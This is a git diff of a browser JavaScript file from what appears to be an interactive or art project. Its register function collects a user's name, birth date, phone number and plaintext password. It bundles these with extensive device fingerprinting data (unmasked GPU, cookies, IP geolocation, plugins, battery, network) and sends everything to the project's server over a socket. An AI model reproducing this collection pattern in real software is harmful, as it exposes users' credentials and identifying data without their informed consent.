@@ -3,10 +3,39 @@ socket.on('mouse', teste);
 window.addEventListener("mousedown", myScript);
 
 function myScript() {
-  var data = "myScript()";
+  var data = "clicking";
   console.log(data);
   //socket.emit('emissor', data);
 }
+
+
+window.onload = function() {
+  function updateBatteryStatus(battery) {
+    document.querySelector('#charging').textContent = battery.charging ? 'Your device is charging' : 'Your device is not charging';
+    document.querySelector('#level').textContent = battery.level + "% out of 100%";
+    document.querySelector('#dischargingTime').textContent = "(DischargingTime / 60) = " + battery.dischargingTime / 60;
+  }
+
+  navigator.getBattery().then(function(battery) {
+    // Update the battery status initially when the promise resolves ...
+    updateBatteryStatus(battery);
+
+    // .. and for any subsequent updates.
+    battery.onchargingchange = function() {
+      updateBatteryStatus(battery);
+    };
+
+    battery.onlevelchange = function() {
+      updateBatteryStatus(battery);
+    };
+
+    battery.ondischargingtimechange = function() {
+      updateBatteryStatus(battery);
+    };
+  });
+};
+
+
 
 /* TAKING FOTOS https://github.com/nwjs/nw.js/wiki/Control-camera-and-microphone-with-getusermedia-api */
 if (navigator.webkitGetUserMedia) {
@@ -78,10 +107,12 @@ document.getElementById('c6').innerHTML = "- Credentials_" + navigator.appName;
 document.getElementById('c7').innerHTML = "- Credentials_" + navigator.appCodeName;
 document.getElementById('c8').innerHTML = "- cookieEnabled_" + navigator.cookieEnabled;
 
+var ip_;
 /* IP */
 $(document).ready(function() {
   $.getJSON('http://gd.geobytes.com/GetCityDetails?callback=?', function(data) {
     document.getElementById('e1').innerHTML = "- " + "<br>" + JSON.stringify(data, null, 2) + "<br>";
+    ip_ = JSON.stringify(data, null, 2);
   });
 });
 
@@ -193,16 +224,101 @@ Ponto de vista visual -> como alimenta o espaço
 
 Fazer login e dar stream segunda pagina depois
 */
-function register() {
-  var reg1 = document.getElementById('inputName').value;
-  if (reg1 != "") {
-    console.log(reg1);
+
+function register(v) {
+  var reg1 = document.getElementById('input1').value;
+  var reg2 = document.getElementById('input2').value;
+  var reg3 = document.getElementById('input3').value;
+  var reg4 = document.getElementById('input4').value;
+  var reg5 = document.getElementById('input5').value;
+
+  var a1 = document.getElementById('a1').innerHTML = "- cores " + navigator.hardwareConcurrency;
+  var a2 = document.getElementById('a2').innerHTML = "- performance Memory_jsHeapSizeLimit_" + performance.memory.jsHeapSizeLimit;
+  var a3 = document.getElementById('a3').innerHTML = "- performance Memory_totalJSHeapSize_" + performance.memory.totalJSHeapSize;
+  var a4 = document.getElementById('a4').innerHTML = "- performance Memory_usedJSHeapSize_" + performance.memory.usedJSHeapSize;
+  var a5 = document.getElementById('a5').innerHTML = "- performance Timing_connectEnd_" + performance.timing.connectEnd;
+  var a6 = document.getElementById('a6').innerHTML = "- performance Timing_connectStart_" + performance.timing.connectStart;
+  var a7 = document.getElementById('a7').innerHTML = "- performance Timing_domComplete_" + performance.timing.domComplete;
+  var a8 = document.getElementById('a8').innerHTML = "- performance Timing_domContentLoadedEventEnd_" + performance.timing.domContentLoadedEventEnd;
+  var a9 = document.getElementById('a9').innerHTML = "- performance Timing_domContentLoadedEventStart_" + performance.timing.domContentLoadedEventStart;
+  var a10 = document.getElementById('a10').innerHTML = "- performance Timing_domInteractive_" + performance.timing.domInteractive;
+  var a11 = document.getElementById('a11').innerHTML = "- performance Timing_domLoading_" + performance.timing.domLoading;
+  var a12 = document.getElementById('a12').innerHTML = "- performance Timing_domainLookupEnd_" + performance.domainLookupEnd;
+  var a13 = document.getElementById('a13').innerHTML = "- performance Timing_domainLookupStart_" + performance.timing.domainLookupStart;
+  var a14 = document.getElementById('a14').innerHTML = "- performance Timing_fetchStart_" + performance.timing.fetchStart;
+  var a15 = document.getElementById('a15').innerHTML = "- performance Timing_loadEventEnd_" + performance.timing.loadEventEnd;
+  var a16 = document.getElementById('a16').innerHTML = "- performance Timing_loadEventStart_" + performance.timing.loadEventStart;
+  var a17 = document.getElementById('a17').innerHTML = "- performance Timing_redirectEnd_" + performance.timing.redirectEnd;
+  var a18 = document.getElementById('a18').innerHTML = "- performance Timing_redirectStart_" + performance.timing.redirectStart;
+  var a19 = document.getElementById('a19').innerHTML = "- performance Timing_responseEnd_" + performance.timing.responseEnd;
+  var a20 = document.getElementById('a20').innerHTML = "- performance Timing_responseStart_" + performance.timing.responseStart;
+  var a21 = document.getElementById('a21').innerHTML = "- performance Timing_secureConnectionStart_" + performance.timing.secureConnectionStart;
+  var a22 = document.getElementById('a22').innerHTML = "- performance Timing_unloadEventEnd_" + performance.timing.unloadEventEnd;
+  var a23 = document.getElementById('a23').innerHTML = "- performance Timing_unloadEventStart_" + performance.timing.unloadEventStart;
+
+  canvas = document.getElementById("glcanvas");
+  var gl = canvas.getContext("experimental-webgl");
+
+  var a24 = "- GL RENDERER " + gl.getParameter(gl.RENDERER);
+  var a25 = "- GL RendererUM " + getUnmaskedInfo(gl).renderer;
+  var a26 = "- GL VENDOR " + gl.getParameter(gl.VENDOR);
+  var a27 = "- GL VendorUM " + getUnmaskedInfo(gl).vendor;
+
+  var a28 = document.getElementById('b1').innerHTML = "- Device Screen Width_" + screen.width + "<br>";
+  var a29 = document.getElementById('b2').innerHTML = "- Device Screen Height_" + screen.height + "<br>";
+  var a30 = document.getElementById('b3').innerHTML = "- Device Screen availWidth_" + screen.availWidth + "<br>";
+  var a31 = document.getElementById('b4').innerHTML = "- Device Screen availHeight_" + screen.availHeight + "<br>";
+  var a32 = document.getElementById('b5').innerHTML = "- Device Screen colorDepth_" + screen.colorDepth + "<br>";
+  var a33 = document.getElementById('b6').innerHTML = "- Device Screen pixelDepth_" + screen.pixelDepth + "<br>";
+
+  var a34 = document.getElementById('c1').innerHTML = "- User Agent_" + navigator.userAgent + "<br>";
+  var a35 = document.getElementById('c2').innerHTML = "- Vendor_" + navigator.vendor + "<br>";
+  var a36 = document.getElementById('c3').innerHTML = "- ProductSub_" + navigator.productSub + "<br>";
+  var a37 = document.getElementById('c4').innerHTML = "- Platform_" + navigator.platform + "<br>";
+  var a38 = document.getElementById('c5').innerHTML = "- Navigator_Languages_" + navigator.languages + "<br>";
+  var a39 = document.getElementById('c6').innerHTML = "- Credentials_" + navigator.appName + "<br>";
+  var a40 = document.getElementById('c7').innerHTML = "- Credentials_" + navigator.appCodeName + "<br>";
+  var a41 = document.getElementById('c8').innerHTML = "- cookieEnabled_" + navigator.cookieEnabled + "<br>";
+
+  var a42 = document.getElementById('f1').innerHTML = "- internetHistory_thisTab =" + window.history.length + "pages";
+  var a43 = document.getElementById('f2').innerHTML = "- thisIsAcookie =" + document.cookie;
+
+  var x = navigator.plugins.length; // store the total no of plugin stored
+  var txt = "Total plugin installed: " + x + "<br/>";
+  txt += "Available plugins are->" + "<br/>";
+  for (var i = 0; i < x; i++) {
+    txt += navigator.plugins[i].name + "<br/>";
+  }
+  var a44 = txt;
+
+  var ok1 = document.getElementById('charging');
+  var ok2 = document.getElementById('level');
+  var ok3 = document.getElementById('dischargingTime');
+  var a45 = ok1.innerHTML + '<br>';
+  var a46 = ok2.innerHTML + '<br>';
+  var a47 = ok3.innerHTML + '<br>';
+
+  var a48 = "Network effective bandwidth estimate " + navigator.connection.downlink + " MB/s" + '<br>';
+  var a49 = "Max download speed " + navigator.connection.downlinkMax + " MB/s" + '<br>';
+  var a50 = "Effective connection type " + navigator.connection.effectiveType + " MB/s" + '<br>';
+  var a51 = "estimated effective round-trip " + navigator.connection.rtt + " rounded to the nearest multiple of 25 milliseconds" + '<br>';
+  var a52 = "network connection type " + navigator.connection.type + '<br>';
+  var a53 = navigator.language || navigator.userLanguage;
+
+  var ok4 = document.getElementById('loggedIn');
+  var a54 = ok4.innerHTML + '<br>';
+
+
+  if (reg1 != "" && reg2 != "" && reg3 != "" && reg4 != "" && reg5 != "") {
+    var data = [];
+    data.push("<b>Name</b>" + '<br>' + reg1 + '<br>' + '<b>Date of Birth</b>' + '<br>' + reg2 + '<br>' + '<b>Mobile Phone</b>' + '<br>' + reg3 + '<br>' + '<b>Genre</b>' + '<br>' + reg4 + '<br>' + '<b>Password</b>' + '<br>' + reg5 + '<br><br> <b>CPU</b> <br>' + a1 + '<br>' + a2 + '<br>' + a3 + '<br>' + a4 + '<br>' + a5 + '<br>' + a6 + '<br>' + a7 + '<br>' + a8 + '<br>' + a9 + '<br>' + a10 + '<br>' + a11 + '<br>' + a12 + '<br>' + a13 + '<br>' + a14 + '<br>' + a15 + '<br>' + a16 + '<br>' + a17 + '<br>' + a18 + '<br>' + a19 + '<br>' + a20 + '<br>' + a21 + '<br>' + a22 + '<br>' + a23 + '<br> <b>GPU</b> <br>' + a24 + "<br>" + a25 + "<br> <b>VENDOR</b> <br>" + a26 + "<br>" + a27 + "<br> <b>DISPLAY</b> <br>" + a28 + a29 + a30 + a31 + a32 + a33 + "<b>ACCESS DEVICE</b><br>" + a30 + a31 + a32 + a33 + a34 + a35 + a36 + a37 + a38 + a39 + a40 + a41 + "<b>IP</b><br>" + ip_ + "<br><b>HISTORY</b><br>" + a42 + '<br>' + a43 + '<br><b>PLUGINS</b></br>' + a44 + '<b>BATTERY</b></br>' + a45 + a46 + a47 + '<b>NETWORK INFO</b></br>' + a48 + a49 + a50 + a51 + a52 + '<b>DEVICE LANGUAGE</b></br>' + a53 + '<b>USER CONNECTED TO</b></br>' + "User: " + reg1 + " is connected to " + a54);
+    socket.emit('email', data);
+    console.log("mail sent");
   }
 }
 
 function nextPage(v) {
   if (v == "one") {
-    socket.emit('email', "Afinal a porta 45 funciona mesmo caralho");
     document.getElementById("cenaUm").style.display = "block";
     document.getElementById("cenaDois").style.display = "none";
     document.getElementById("cenaTres").style.display = "none";
@@ -294,31 +410,7 @@ window.addEventListener("devicemotion", function(event) {
 
 }, true);
 
-window.onload = function() {
-  function updateBatteryStatus(battery) {
-    document.querySelector('#charging').textContent = battery.charging ? 'Your device is charging' : 'Your device is not charging';
-    document.querySelector('#level').textContent = battery.level + "% out of 100%";
-    document.querySelector('#dischargingTime').textContent = "(DischargingTime / 60) = " + battery.dischargingTime / 60;
-  }
 
-  navigator.getBattery().then(function(battery) {
-    // Update the battery status initially when the promise resolves ...
-    updateBatteryStatus(battery);
-
-    // .. and for any subsequent updates.
-    battery.onchargingchange = function() {
-      updateBatteryStatus(battery);
-    };
-
-    battery.onlevelchange = function() {
-      updateBatteryStatus(battery);
-    };
-
-    battery.ondischargingtimechange = function() {
-      updateBatteryStatus(battery);
-    };
-  });
-};
 
 
 function saveToDB(id, link) {
